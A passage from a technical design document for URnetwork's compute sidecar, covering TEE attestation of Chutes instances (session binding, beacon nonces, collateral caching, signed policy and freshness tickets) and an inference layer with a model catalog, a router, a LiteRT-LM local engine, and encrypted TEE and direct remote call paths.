A relay that chose the instance, or passed keys without evidence, could point the device at any TEE chute, its own included, since every chute shares the base image's measurement; teep documented the second gap in a reseller of Chutes ([Rpt:bt]). The broker also returns the keys, so it could narrow the choice by withholding all but one: the device picks at random among the instances that verify, weighted by their load hints, and refuses a `prepare` whose keys cover fewer than half of the listed instances (§6.6), so no broker can steer a call to one machine whose holder may have attacked it.

**Session binding.** A key bound in report data proves the key was made in the TEE, not that the session ends there now: whoever extracts that key with a physical attack can answer as the TEE (the construction CVE-2026-33697 describes). Enclaves therefore bind each session too: on attach, the client asks the enclave over the SSH channel for fresh evidence whose report data is `SHA-512("urnetwork-sidecar-v1/enclave-session" ‖ 0x00 ‖ nonce ‖ the SSH session's exchange hash)`, and refuses a session whose evidence does not verify. Chutes offers no session binding; its instance keys are per instance, so the residual is stated in §2.6.

### 5.6 Freshness and scale

- **Nonce.** By default a device draws 32 random bytes per evidence request.
- **Cache.** A pass is kept per (provider, instance or VM, key) for 10 minutes, or until the instance's key changes, whichever is first; an enclave's pass is kept for the life of its provisioning (one use).
- **Beacon nonces (Q-ATTEST-1).** Per-device nonces mean one evidence fetch per device per instance per 10 minutes, which a provider's per-caller rate limit and quote generation will not carry at scale (10,000 active devices over 10 instances is about 170 fetches a second). From M15 the broker may fetch, per instance per 2-minute window, evidence bound to a beacon nonce: `SHA-256("urnetwork-sidecar-v1/beacon" ‖ drand round ‖ its signature)` from the drand League of Entropy's quicknet chain. The device verifies the round's BLS signature under the chain's pinned public key and accepts a round no older than 5 minutes. Nobody, the broker included, can obtain evidence for a round before the round exists, so a beacon pass is as fresh as the window; the broker serves one fetch to every device. Chutes' evidence names no chute, so the device still reads the chute's instance list itself, over its own TLS session (5.7), and takes beacon evidence only for instances that list names, which keeps the broker from handing over its own chute's instance.

### 5.7 The collateral cache and the evidence tunnel

**The tunnel.** `compute.bringyour.com/v1/tunnel` relays a byte stream (a WebSocket) from the device to one host on an allowlist, `api.chutes.ai:443` first, and the device runs TLS to that host inside it, checking the host's WebPKI certificate. The broker sees the host, the sizes and the times, not the evidence or the instance list, and cannot change them; the provider sees URnetwork's address, not the person's. Since every device arrives from the broker's address, the provider's limit for that address is shared by all users: G-PROV-chutes's agreement fixes anonymous access to the evidence endpoint and a rate for URnetwork's addresses (§4.7), and the broker opens at most 20 tunnels a minute for any one sidecar, enough to check each instance of a model, so no one device spends the rest's share.

**The cache.** Intel PCS, AMD KDS and NVIDIA's RIM and OCSP services are reached through `GET compute.bringyour.com/v1/collateral/...`, which caches each signed item until its own next-update time. Every item is signed by its vendor, so the cache can withhold an item or serve a stale one but not forge one. A stale item is not harmless: TCB info and revocation lists stay valid for weeks (Intel's TCB info about 30 days, by inference), so last month's would keep a downgraded TCB at UpToDate or a revoked key passing, and revocation is the vendors' only answer to an extracted key (§2.6). So the device checks each item's validity window, refuses one older than the policy's maximum age for its vendor, 7 days where the vendor re-signs at least weekly, or whose TCB evaluation data number is under the policy's minimum (5.4), and, when the cache's copy is more than a day old, fetches the item itself through its egress, the vendor seeing an exit's address, and keeps the newer. The cache exists for three reasons ([Rpt:bt]): Intel's service answers an empty body to any request with an `Origin` header and NVIDIA's reference service sends no CORS headers, so a browser cannot fetch them; one uncached fetch takes 0.2-0.6 s; and vendors should not see each person's address.

### 5.8 The result

```proto
// attest.proto; carried in the record's model_call and enclave entries (§6.8, §11.12)
message AttestationResult {
  string provider = 1;                 // "chutes"
  string label = 2;                    // "A1", "A2", "AP"
  string scheme = 3;                   // "chutes-e2e-v1"
  string cpu = 4;                      // "tdx" | "snp"
  string profile_id = 5;               // the policy profile matched
  string profile_review = 6;           // "reproduced" | "listed"
  string tcb = 7;                      // "UpToDate", or the SNP firmware level
  repeated string gpus = 8;            // "b200", ...
  uint64 policy_version = 9;
  bytes evidence_sha256 = 10;          // of the evidence as received
  bytes key_sha256 = 11;               // of the key bound
  string instance_id = 12;
  int64 verified_millis = 13;
  string verifier = 14;                // "ur 2027.1.3 / nras" | "ur … / local"
  string provider_model_id = 15;       // the id the policy pins for the model (Chutes: its chute_id)
}
```

### 5.9 Alternatives considered

| Option | Pros | Cons | Verdict |
|---|---|---|---|
| Trust the provider's attestation verdict (Targon's tower, Chutes' own clients) | no verifier to build | the party being checked answers the check | rejected (R-ATTEST-1) |
| Verify on URnetwork's servers and tell devices | one verifier | a breached server could approve anything; the directive's spirit | rejected |
| RA-TLS (evidence in the TLS certificate) | standard tooling | a key bound once can be answered for by whoever extracts it (CVE-2026-33697); Chutes does not offer it for E2E | rejected; keys in report data for setup, and sessions bound for enclaves (5.5) |
| IETF SEAT post-handshake binding (draft-fossati-seat-expat-04) | the standard to come | a draft; no Go implementation | Later, when a provider offers it |
| Tinfoil's verifier | open, client-side, Go | AGPL-3.0, ~80 MB as wasm | rejected as a dependency; its design informs this one |

### 5.10 Decisions proposed

**D-ATTEST-1 (proposed).** The device verifies every check of 5.3 itself, with vendored Google libraries for TDX and SNP and NRAS, then a local verifier, for GPUs. *Why:* R-ATTEST-1.

**D-ATTEST-2 (proposed).** A signed, monotonic, 90-day policy pins roots, TCB floors, measurement profiles, custody lists and revocations. *Why:* R-ATTEST-3; a compute-policy key the release key certifies keeps two signers on each version without the release ceremony (Q-ATTEST-4).

**D-ATTEST-3 (proposed).** Keys are taken only from the response whose evidence binds them, and the device recomputes every binding. *Why:* the relay gap.

**D-ATTEST-4 (proposed).** A cache salt heads every remote request: per member on the TEE path, per run on the direct path, whose provider reads it (§6.6). *Why:* Chutes issue #78's cross-account prompt cache, and owner decision 126's line between members.

**D-ATTEST-5 (proposed).** Daily freshness tickets, signed weekly 14 days ahead and kept unreleased apart from the serving path and the broker, bound how long a withheld policy keeps a revocation from taking effect: 72 hours, or 14 days if the ticket host is taken too; a lapse stops remote model calls, enclave creates, starts and seatings, and searches. *Why:* withholding a revocation widens the policy, which IC-9 forbids.

**D-ATTEST-6 (proposed).** The device reads a provider's instance list and evidence over its own TLS session, through the broker's tunnel, for the provider id the policy binds to the model. *Why:* the broker must not choose the machine.

**D-ATTEST-7 (proposed).** The policy carries every disclosure's id, version, grace and revision, and per locale its summary and lists, and devices render only the newest verified policy's text. *Why:* the policy key's signature keeps a breached server from softening a text, and a corrected text ships without a release (§2.8).

**D-ATTEST-8 (proposed).** A staging policy, signed by a staging key the release key certifies for its own namespace alone and verified only by staging and CI builds, carries a gated line before its gate passes, so each gate is tested end to end while users' devices see the line only once it passes. *Why:* every gate (§4.7, §19.2) needs a test before users; one global policy cannot hold a line for testers alone.

**D-ATTEST-9 (proposed).** A compute-policy key, two of four holders on hardware tokens, signs the policy and its tickets under the release key's certificate for that namespace, and a staging key, certified for the staging namespace alone, signs the staging policy. *Why:* the policy changes about weekly, which DESIGN's offline release ceremony cannot serve (owner decision 264), while devices still pin the release key alone; Q-ATTEST-4.

**D-ATTEST-10 (proposed).** The policy carries a minimum TCB evaluation data number, a maximum age per vendor for collateral and revocation lists, 7 days where the vendor re-signs weekly, and the NRAS root; a device fetches collateral itself, through its egress, when the cache's copy is over a day old; and devices pick at random among verified instances, refusing a `prepare` that narrows them below half. *Why:* a stale signed item keeps a downgraded TCB or a revoked key passing for weeks, and a broker that chooses the machine can aim a physical attack (5.7, §2.7).

### 5.11 Questions

**Q-ATTEST-1.** Per-device nonces or beacon nonces? *Options:* (a) per-device always; (b) beacon always; (c) per-device until M15, beacon after, per-device still used for enclaves. *Answer:* (c). Per-device nonces are simplest and enough at launch's volume; the beacon keeps the same freshness bound at any scale, and enclaves, provisioned once each, keep their own nonces. *Decider:* peer review.

**Q-ATTEST-2.** NRAS or a local GPU verifier? *Options:* (a) NRAS through the broker; (b) local from the start. *Answer:* (a) when the Chutes path ships, (b) once GPU enclaves need the local verifier, both in M15 (§19.3). NRAS's answer is signed, so the broker cannot forge it; a local verifier removes NVIDIA's view of which GPUs URnetwork uses and a service dependency, but there is no Go implementation to start from. *Decider:* peer review.

**Q-ATTEST-3.** How long is a pass trusted? *Options:* per request; 10 minutes; an hour. *Answer:* 10 minutes per instance and key: long enough that a conversation's turns reuse one check, short enough that an instance withdrawn or a key rotated is noticed within the window, and a re-check costs one fetch. *Decider:* peer review.

**Q-ATTEST-4.** Who may sign the policy? *Options:* (a) the release key; (b) a compute-policy key that the release key certifies for the policy's namespace, two of its four holders signing, with a staging key certified for staging alone. *Answer:* (b). The policy changes about weekly, as providers roll images and texts change, and carries a sitting's tickets each week (5.4); DESIGN keeps the offline two-person release key for promotions because its ceremony cannot gate a pipeline that runs that often (owner decision 264), and providers' rolls would otherwise wait on it, TEE calls failing closed meanwhile. Devices still pin the one root and check the certificate's namespace and expiry, and two signers still sign each version, so no one person or server can widen the policy. *Decider:* owner, confirmed (CO-42).

**Q-ATTEST-5.** Who holds the unreleased freshness tickets, and how far ahead are they signed? *Options:* (a) 90 days in one sitting, released from ur.io; (b) 14 days at a weekly sitting, the unreleased ones on a host apart from ur.io's serving path and the broker; (c) one ticket a day, signed that day. *Answer:* (b). The unreleased tickets are the very capability a revocation must defeat: under (a) whoever takes the releasing host holds up to 90 days of them and keeps a revoked profile or chip passing that long; (c) needs two signers every day; (b) bounds the worst case at 14 days, and at 72 hours unless the separate ticket host falls too, for one sitting a week. *Decider:* owner, confirmed (CO-42).

### 5.12 Risks

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| A miner forges quotes with extracted keys (TEE.fail, DDRop) | low per machine; one extraction serves every machine its holder runs, and a breached broker can aim it (§2.7) | plaintext of requests the machines serve | §2.6: A2 where custody registries cover; revocation of chip identities; a random choice among verified instances (5.5); a staging client that reads every listed instance's evidence as a device does and alarms when one chip identity stands behind more instances than a machine can host, which leads to its revocation; disclosure |
| A vendor root or TCB rule changes | medium | evidence fails | the 90-day policy; a new policy in days |
| The policy's signers are slow | low | remote model calls, enclave creates and searches stop 72 hours after the last signed ticket's day, 17 days after the last sitting, and everything remote at `not_after` | a weekly sitting with 7 days of slack; any two of four holders (§14.10); the ticket horizon pages from 7 days, the expiry from 14 |
| The ticket host and the serving path both taken | low | a withheld revocation lasts up to 14 days | the host apart, with its own account, keys and deploy; the short horizon (5.4) |
| Borrowed GPU evidence (GPU reports not bound to the VM) | low | a fake GPU behind a real CPU quote | none complete on current Hopper and Blackwell; disclosed |

## 6. Inference: the catalog, the router, the local engine and the remote path

### 6.1 Purpose and scope

This section owns inference below the Harness and the gateway: the one catalog both use (CO-11), the router that runs a request locally or remotely, the LiteRT-LM engine on each platform, the remote paths (through the broker, encrypted, for a TEE; from the device for a model without one), the device's check of each charge, and the model receipt in the record. Attestation is §5; prices and holds §9; the Harness §7; the gateway §8.

### 6.2 Requirements

| Id | Requirement | Source |
|---|---|---|
| R-INFER-1 | One catalog: every local model the device can run and every remote model, in a TEE or not, with its label, the same for the Harness, the gateway and any agent either launches | CO-11, CO-18 |
| R-INFER-2 | Local inference with LiteRT-LM, free, with no server in its path | CO-1, CO-9 |
| R-INFER-3 | A TEE-labeled model only through §5's verified, end-to-end path; a model without a TEE only by the direct path (6.6); never a silent move to another model, provider or label | CO-2, CO-18; R-CCTX-2 |
| R-INFER-4 | Streaming text, reasoning and tool calls, structured output, on both paths | CO-1; the Harness |
| R-INFER-5 | The provider sees what is asked but not who asks; URnetwork sees who asks but not what | directive; derived |
| R-INFER-6 | Each call is recorded with its model, usage, cost and attestation | DESIGN §16.8; RECORD.md section 12 |
| R-INFER-7 | One namespace: every model has one canonical name, `<provider>-<model>-<effort>` | CO-18 |
| R-INFER-8 | Every model shows its provider's disclosure line; a model labeled `none` is called only once the person has acknowledged its provider's disclosure at its current version, however a run reached it | CO-33, CO-34 |

### 6.3 The catalog

```text
name          <provider>-<model>-<effort>, lowercase: one namespace for every model, local or remote, in a TEE
              or not (CO-18), such as local-gemma-4-e4b-off or chutes-qwen3.8-27b-tee-high
  provider    the provider's slug, [a-z0-9]+ with no hyphen: local, chutes, …; named by team, never by netuid
              (D-PROV-4)
  model       the provider's own id for the model, normalized: lowercased; an organization prefix
              ("deepseek-ai/") dropped, unless two of the provider's ids differ only by it, when both keep it;
              "/", "_", ":" and spaces made "-"; runs of "-" collapsed; only [a-z0-9.-] kept; a provider's own
              marks stay, as Chutes' "-tee", but a TEE mark (the word tee, tdx or confidential) is dropped from a
              model labeled none, whose name must not claim what its label denies (SayGM's "-tee" models,
              Q-PROV-8); where two ids still give one name, the policy names one of them (§5.4), and a device
              refuses a catalog in which two entries share a name
  effort      off | minimal | low | medium | high | xhigh | max: OpenAI's levels, its none written off, since
              none is also a label (§4.3), a floor and an egress mode, and a request's none read as off; every
              provider's levels map into these ([Rpt:bt] all_inference_providers.md), mapped by the router onto
              the provider's own parameter (6.4); a model lists the efforts it takes, and off alone if it has no
              reasoning
  parsing     the provider is the text before the first "-", the effort the text after the last, the model what
              lies between; the catalog, not the parse, decides that a name exists
  alias       <provider>-<model> without the effort: the request's own effort parameter, mapped to the nearest
              the model takes, else the model's default (Q-INFER-5); a name that reads both ways is a full name
              first, and a model whose own id ends in an effort word takes no alias
search ids    search/<engine>/<kind>, outside the model namespace: a search endpoint, not a model, such as
              search/parallel/fast (§21), with its price per search
fields        name, kind (local|tee|direct|search), label (A1|A2|AP|none, §4.3, or local: on this device, which
              every floor, provider list and tee_only admits, since nothing leaves it, CO-9), efforts, context
              window, max output, tools (yes/no) and a tool budget (§7.4), structured output, modalities (text, image), license, and
              local:  file, size, SHA-256, minimum RAM, accelerators, measured decode tokens/s on reference devices
              remote: the provider and its own id for the model, and the network's three prices per million
                      tokens (input, output, cached input); for a TEE label, the policy profiles it may run on and
                      "serving code measured: no" where §4.5 says so
sources       local entries: the manifest each ur release carries, signed with the release; remote entries: the
              broker's GET /v1/catalog, joined on the device with the signed policy, so a model the policy does not
              cover, in a TEE or not, is shown unusable and never run, and a direct entry's host, receiver and
              targets must equal the policy's, and its provider id, zero-retention rule and upstreams come from
              the policy's `models` map alone, never from the catalog (§5.4)
disclosure    inference:<provider> (§2.8): its summary line shows beside the label wherever the model is
              offered; a model labeled none is called only once the person has acknowledged it (6.4; CO-34)
version       the broker's catalog has a version; a request names it, and its prices are what the request is
              charged (§9.6); the broker takes the current version, and the one before it for 24 hours after a
              newer one is published, refusing an older one with catalog_stale, after which the device fetches
              the catalog and asks again, so a modified client cannot keep an old price; a provider whose price
              varies by request is listed at the most it charges (SayGM: its list, which its charge per request
              stays under)
```

The catalog shows only what this device may use: a local entry the device lacks the memory for is listed as unavailable with the reason, and a remote entry the person's policy, floor, provider list or budget refuses (§16.4) likewise. Every entry shows its label and its provider's disclosure line (§2.8), and the list filters to TEE models or to chosen providers. CO-11's "full catalog" is this list: every agent, local or in an enclave, sees the same entries and may pick any it is allowed, the person in the picker and an agent through `models_list` (§7.5). A filter or floor that leaves no remote entry, as a TEE floor does while no TEE provider has passed its gate (Chutes until SN64 takes gamma, CO-32), shows the local entries with the reason no remote one is offered.

### 6.4 The router

```go
// infer_router.go; on every leg but the VPN component's
type InferRequest struct {
	Model        string            // a canonical name (6.3)
	Messages     []*InferMessage   // system, user, assistant (text, reasoning, tool calls), tool results; images
	Tools        []*InferTool      // name, description, JSON schema
	ToolChoice   string            // auto | none | required | <tool name>
	Schema       []byte            // a JSON schema for structured output, or nil
	Reasoning    string            // none … max (6.3): the name's effort, else the request's
	MaxOutput    int
	Sampling     *InferSampling    // temperature, top_p, stops
	RunId        *Id               // the run and agent the call belongs to (DESIGN §5.5)
	AgentId      *Id
	Budget       *InferBudgetRef   // the gateway grant or Harness budget it spends (§16.4)
}
type InferEvent struct {           // one stream per request
	Kind     string                // start, text, reasoning, tool_call_start, tool_call_args, tool_call_end, usage,
	                               // attestation, error, end
	Text     string
	ToolCall *InferToolCall
	Usage    *InferUsage           // input, output, cached, reasoning tokens; charge (remote)
	Attest   *AttestationResult    // remote: before the first token
	Error    *InferError           // code: tee_unverified, capacity, insufficient_quota, context_length, model_refused,
	                               //       engine_failed, canceled, disclosure_required
}
type InferRouter interface {
	Catalog(ctx context.Context) (*InferCatalog, error)
	Infer(ctx context.Context, request *InferRequest) (<-chan *InferEvent, error)
}
```

The router checks a remote model against the policy, the floor, the provider list and the budget (§16.4), and a local one against the person's `allow` alone, since it is free and nothing leaves the device (CO-9), so a local call runs in every state of the balance and past every budget (§9.9); and for a model labeled `none` the person's acknowledgment of its provider's disclosure (below), and, for a run that carries a connected service's `limited_use` mark, that the model is local or one the policy's `limited_use` line lists, whatever its label (§5.4, §25.10), refusing others with `service_model`; then it routes by the entry's kind: local, tee (6.6's TEE path) or direct (6.6's direct path). It maps the effort onto the provider's own parameter by a table in the provider's adapter, and never sends a model an effort it does not list. It never changes the model: a remote error that leaves no instance of the model is the caller's to handle, and the Harness shows the person the choice (§7.4). Within one remote model it may move to another instance that passes §5, up to 3 tries, since that is the same model behind the same policy profile.

**The disclosure check** (CO-34). Before any call to a model labeled `none`, the router reads the acknowledgments that cover the caller (§2.8): the person's `compute.disclosures`, an enclave's sponsor's, or, on a tagged or cloud sidecar, the network's (CO-41). If they lack the provider's disclosure at its current version, or the previous one within a new version's grace, the run the person is attached to raises the `disclosure` request (§7.6) and waits, a "Not now" failing the call with §7.4's choice of another model or local; any other run gets `disclosure_required`, naming the id, before the broker is asked or a byte leaves the device, and stops, its stop reason naming the disclosure, so the person can acknowledge it and resume the run (§7.7). Every call passes here, so the check holds however a run reached the model: its first pick, `SetModel`, §7.4's failure choice, a continuation or a fork, in an enclave too (§24.7), a child's launch (§7.9) or a gateway call (§8), mail read or not (§23.5). Local and TEE models pass without it (§2.8).

### 6.5 The local engine

LiteRT-LM v0.19.x (Apache-2.0) has a versioned C API, 1.0.0, that takes OpenAI-style JSON messages and tools and streams through a callback, with cancel, clone and checkpoint calls; it ships as shared libraries only, 23-85 MB a platform, and its GPU plugins are closed binaries ([Rpt:bb]). The sidecar module builds with no cgo (DESIGN CONVENTIONS §8's wasm rule, and `make check`'s legs), so the engine is never linked into `ur` or the sdk's Go archive:

| Platform | How the engine runs | Engine files | Notes |
|---|---|---|---|
| macOS arm64, Linux x86-64 and arm64, Windows x86-64 (`ur`) | a child process, `ur-engine`: a second small executable beside `ur`, loading the C library with purego (no cgo) and speaking JSON lines on stdio, which holds none of `ur`'s keys, keychain access or app groups and which the OS confines to reading its engine and model files, the system's libraries and the GPU's device nodes, with no network: on macOS it has its own identifier inside `ur.app`, the hardened runtime, the App Sandbox with read-only exceptions for those two directories, and the entitlement that lets it load libraries another team signed (`com.apple.security.cs.disable-library-validation`), which `ur` never takes, so the daemon keeps library validation; on Linux, Landlock and a seccomp filter that refuses network sockets; on Windows, an AppContainer with no capabilities, granted read on those directories | the C library and GPU plugins, downloaded at first use from LiteRT-LM's release, each checked against the SHA-256 the signed `ur` manifest pins before the helper loads it | a crash, a leak or a hostile model file takes the engine, never the daemon that holds the keys; one engine process per loaded model; macOS Intel and Windows arm64 have no build and get remote models only |
| iOS, macOS apps | the app embeds LiteRT-LM (its dynamic framework, ~48 MB, Swift or C API) and implements the sdk's `SidecarLocalInferenceHost` (below); the router calls it | in the app bundle, since iOS forbids downloaded code | the app process only, never the network extension ([owner decision 197](DESIGN.md#od-197)) |
| Android app | the app's Kotlin API (stable), the same host interface | by build flavor: `play`, a Play Feature Delivery module (23-27 MB), installed when the person first picks a local model; `github`, the default flavor, which has no Play, the engine in its APK, 23-27 MB larger; that flavor's F-Droid build, which takes no closed binary, the CPU engine built from LiteRT-LM's source without the closed GPU plugin, or none until that build passes | as iOS |
| Browser (`sidecar.wasm`) | none at launch; LiteRT-LM's JS package (WebGPU, early preview) in an offscreen document, Later | — | the extension's Worker is Later anyway (DESIGN §23.4) |
| Enclaves (Debian x86-64) | as Linux, CPU | as Linux | GPU enclaves serve larger models with vLLM, Later |

```go
// sdk host interface (gomobile: strings and int64 only)
type SidecarLocalInferenceHost interface {
	Capabilities() string                                   // JSON: platform, RAM, accelerators
	Load(modelPath string, settingsJson string) (int64, error)
	Generate(handle int64, requestJson string, listener SidecarLocalInferenceListener) error
	Cancel(handle int64)
	Unload(handle int64)
}
type SidecarLocalInferenceListener interface {
	OnEvent(eventJson string)                               // the InferEvent JSON
}
```

**Models.** Local models are downloaded by the daemon or the app into its state directory from Hugging Face's `litert-community` repositories, each file checked against the manifest's SHA-256 before load. Defaults, by memory ([Rpt:bb]; Gemma 4 has been Apache-2.0 since 2026-04-02):

| Device | Default | Size | Measured decode (Gemma 4) |
|---|---|---|---|
| phones with 6 GiB+ | `local-gemma-4-e2b-off` | 2.59 GB (2.34 GB GPU build) | ~52 tok/s GPU (S26 Ultra), ~56 (iPhone 17 Pro); 25-47 CPU |
| laptops with 16 GiB+ | `local-gemma-4-e4b-off` | 3.66 GB | — |
| desktops with 32 GiB+ | `local-gemma-4-12b-off` | 6.9 GB | — |
| desktops with 48 GiB+ unified memory | `local-gemma-4-26b-a4b-off` | ~16 GB | — |

Other `litert-community` packages (Qwen 3.5, Phi-4-mini and others) enter the manifest when tested; gated Gemma 3 and 3n do not.

**Known engine faults and what the engine wrapper does** ([Rpt:bb], issues as of v0.19.1): interleaved conversations lose state (#2807), so one conversation per engine handle; a conversation cannot be reused after cancel, so a cancel closes the handle and the next turn reopens it from the saved messages; FP16 activations corrupt digits at 2-4K tokens on iOS and Adreno GPUs (#3913, #4001), so those GPUs run FP32 activations; multi-token prediction with conversation clone grows memory on Android (#4641), so the wrapper never uses both; the v0.19.1 macOS and Android builds need the Dawn WebGPU library even for CPU or Metal (#4611), so the manifest pins it beside the engine.

**Tools on a local model.** The engine's documented tool calling returns `tool_calls` as JSON, with constrained decoding forcing the model's call syntax; structured output uses its LLGuidance mode. One conversation may use only one of the two modes, so a request that has both tools and a schema runs tools first and the schema on a final turn. A small model's tool use is weaker than a large remote model's, and the catalog says so; CO-11 leaves the choice to the person. The Harness keeps a request's tool schemas and the skill within the model's tool budget, a quarter of its window, by giving a small model the small tool set (§7.4).

**Sharing one model.** Local agents that use one model share its engine: one call at a time on a phone, up to two on a desktop with the memory for both, the rest waiting in arrival order between whole calls. Each agent keeps its own conversation handle (#2807) while memory allows; past that, a waiting agent's handle is closed and reopened from its saved messages at its turn. §7.9's eight agents bound agents at work, not concurrent local calls, and a waiting agent's status reads `waiting`, its activity naming the model (§20.6).

**Phones in the background.** An app's Harness runs only while the app does (§20.7). When the app leaves the foreground, no new model call or tool starts. A call in flight finishes within the time the OS grants (iOS: a background task, about 30 seconds; Android: a short foreground service, about 3 minutes), else it is cancelled: iOS gives a background app no GPU, so a local call on the GPU is cancelled at once; a remote stream is closed, the broker then cancelling the provider's call on the TEE path; and a closed stream is billed as its provider bills it (6.6). Each item already complete is journaled (§24), and the run pauses at that item boundary, its stop reason `backgrounded`, so the next foreground resumes it and retries a cut call, with nothing lost or done twice.

### 6.6 The remote paths

**The TEE path**, for models labeled A1, A2 or AP:

```text
device                                broker (computeservice)                 provider (Chutes)
 1 over the broker's tunnel (§5.7), the device's own TLS to api.chutes.ai:
   GET /chutes/{chute_id}/evidence?nonce=<device nonce>, for the chute_id the policy binds to the model
 2 prepare(model) ──────────────────▶ GET /e2e/instances/{chute_id} (URnetwork's key)
   ◀──────── instance E2E keys and one-use nonces
 3 verify (§5): keep instances that are in 1's list, pass every check and whose key 2 gave binds in their
   evidence; pick one at random, weighted by its load hint, refusing a prepare whose keys cover fewer than
   half of 1's instances (§5.5)
 4 seal the request: the provider's E2E envelope (ML-KEM-768 to the instance key, HKDF-SHA256,
   ChaCha20-Poly1305, a fresh ephemeral key per request), body = the Chat Completions request with
   the member's cache salt at the head of the system text
 5 POST /v1/infer, header ComputeInferHeader, body the envelope ──▶ hold (§9.7) ──▶ POST /e2e/invoke
                                      (X-Chute-Id, X-Instance-Id, X-E2E-Nonce; X-E2E-Stream)
   ◀──────── e2e_init and e2e chunks, relayed byte for byte, then ur_usage (the charge)
 6 open each chunk; compare the usage inside the ciphertext with the charge (6.7)
```

```proto
// compute.proto: the clear header of one remote call, the only part the broker reads
message ComputeInferHeader {
  uint64 catalog_version = 1;
  string model = 2;                    // the canonical name (6.3)
  string instance_id = 3;
  string e2e_nonce = 4;                // the provider's one-use nonce from prepare
  uint32 max_input_tokens = 5;         // informational: the hold is the model's worst case (§9.7), since the
  uint32 max_output_tokens = 6;        // broker cannot see the request's own max_tokens
  bytes request_id = 7;                // 16 random bytes
  bytes agent_id = 8;                  // DESIGN §5.5's opaque id, for budgets; empty without an agent
  bool stream = 9;
}
```

- **Who sees what (R-INFER-5).** The broker reads the clear header, the sizes and the timing, and the provider's usage; never the envelope's contents. The provider's API sees URnetwork's account, the instance, the sizes and the timing; never the person's address, since the broker makes the call. The TEE alone sees the request. §14.6's compute-1 row lists the broker's view.
- **The cache salt.** 16 bytes, `HKDF-SHA256(K_sock, info "urnetwork-sidecar-v1/compute-cache-salt" ‖ member_id)`, which every admitted sidecar computes from the socket-name key it already reads (DESIGN §2.6) and no server can; per member, so neither another Chutes customer nor another member of a Team can probe a member's prompts by cache timing (owner decision 126's line); an agent or enclave uses its sponsor's member id. It changes when `K_sock` rotates, costing one round of cache misses. The device writes `[ur:<32 hex>]` as the system text's first line. A prompt prefix shared with anyone else then never matches theirs in the shared cache (Chutes issue #78), while a member's own runs keep their cache hits. Chutes' serving code, inside the boundary at AP, reads the salt, so Chutes could link one member's requests to each other, never to the member; `inference:chutes`'s text says so (§2.8), and a salt per run would cost every new run its cache to hide a link from a party AP already trusts with the plaintext (Q-INFER-3).
- **Errors.** No instance passes: `tee_unverified`, naming the failed checks. 429 at capacity: up to 3 other passing instances, then `capacity`. A hold refused: `insufficient_quota`, its reason `balance` when the network cannot pay (§9.9), `budget` naming the budget and its period (§16.4), or `held`, with a retry time, when the balance would pay but open holds stand in the way (§9.7), on this path and the direct one; the Harness turns `balance` and `budget` into §7.4's "add credit" or "raise the budget", and waits out `held` and retries, so no one is asked for credit they have, and the gateway answers `held` as a 429 with `Retry-After`, which harnesses retry. A provider whose account cannot cover the hold is `capacity`, with a retry time (§10.4). Nothing goes to another model (R-INFER-3).
- **No prompt.** A TEE call asks nothing first, since CO-34 asks only of models without a TEE; its provider's disclosure line shows on the model's badge and on each message (§2.8, §7.6).
- **Streaming and timeouts.** The broker relays chunks as they arrive and sends an SSE comment every 15 s, under the load balancer's stall timeout (DESIGN CONVENTIONS §8: 15 s and 60 s).

**The direct path**, for models labeled `none` (CO-18). No URnetwork server may read the prompt (the directive), and there is no TEE key to seal it to, so the device calls the provider itself.

```text
device                                       broker (computeservice)                     provider (no TEE)
 1 build the provider's request (its API's JSON; the model's id, zero-retention flag and route from the
   policy's `models` map, §5.4; the effort mapped), with 16 random bytes in its `user`
   field (OpenAI's API) or `metadata.user_id` (Anthropic's), so its hash confirms no guess; hash the body
   as btauth/1 does
 2 POST compute/v1/infer/authorize ─────────▶ floor, providers, budget; hold the declared model's
   {catalog_version, model, request_id,         worst case under the exposure rule (§9.7); sign
    agent_id, max tokens, body hash, nonce}     btauth/1 with the spending hotkey K_P over the
                                                method, a target the policy lists, the hash, the
                                                device's nonce, K_P and the provider's service hotkey;
                                                keep the hash, keyed by the nonce, until the call
                                                settles, never in a log
   ◀─────────────────────────────────────────── the btauth/1 headers
 3 within btauth/1's window (a nonce at most 10 s old when the body has arrived, at most 2 s ahead, each
   once), through `auto` egress, TLS to the host the policy pins, its name resolved through the egress
   (§22.4's DoH):
   the request with the headers ──────────────────────────────────────────────────────▶ serve; bill K_P
   ◀───────────────────────────────────────────────────────────────────── the stream and its usage
 4 settle: the device forwards the provider's signed receipt (engy's Ed25519 receipts bind the body hash,
   the usage and the charge), which the broker checks against the hash it kept; without one, the broker
   reads the provider's usage record by the btauth/1 nonce or the body hash, never by an id only the device
   knows (N2), which answers `unknown`, `in progress` or `finished`: finished, it charges the catalog
   prices of the model the provider reports (outside the catalog, the provider's own charge on its receipt
   times the markup) and releases the hold; unknown a minute after the nonce's window, it releases the
   hold at no charge; in progress, it keeps the hold and asks again each minute; while the lookup fails,
   the hold stays pending, never charged (below); the device checks the charge against the usage it saw
   (6.7)
```

- **The headers.** btauth/1's `X-Bittensor-Version`, `-Hotkey`, `-Receiver`, `-Nonce` (Unix nanoseconds), `-Crypto` and `-Signature`, over its eight lines: `btauth/1`, the scheme, the method, the path and query as sent, the SHA-256 of the body, the nonce, the sender and the receiver. Nothing else is bound, so the device must send the very bytes it hashed, once; each authorization has its own hold, and a retry is a new authorization (below).
- **What the broker sees.** The model, the declared maxima, the request id, the hash until the call settles (at most 10 minutes, never in a log), and the provider's usage; never the request or the response. The broker cannot read the body's `model` or `max_tokens`, so it holds the declared model's worst case, which is what an honest device sends, against the balance and budgets alike, and URnetwork carries the gap to the worst case of the costliest model the provider serves URnetwork's hotkey, recomputed from the provider's whole model list at each hourly price read, up to $5 a network: the exposure rule (§9.7) admits a direct call only while every open one of the network, each charged at that costliest worst case, would leave it no more than $5 below its floor. So a device that lies is charged in full and flagged (below; §9.7), and costs URnetwork at most $5; a model the provider adds above its costliest pages, since it narrows every network's room under the rule. A bound the broker can sign and the provider enforces closes the gap: a model allowlist per hotkey, which lets the broker sign with a K_P per model or price tier (a coldkey holds up to 64 deposits a subnet), or the model and a cost cap bound into the signed target. G-PROV-saygm requires one and G-PROV-engy asks engy for one (§4.7); with it, each call is held at its own model's worst case alone. The provider refuses a request its balance cannot cover (engy answers 402, priced at the prompt plus `max_tokens`), and the receipt shows the model it served.
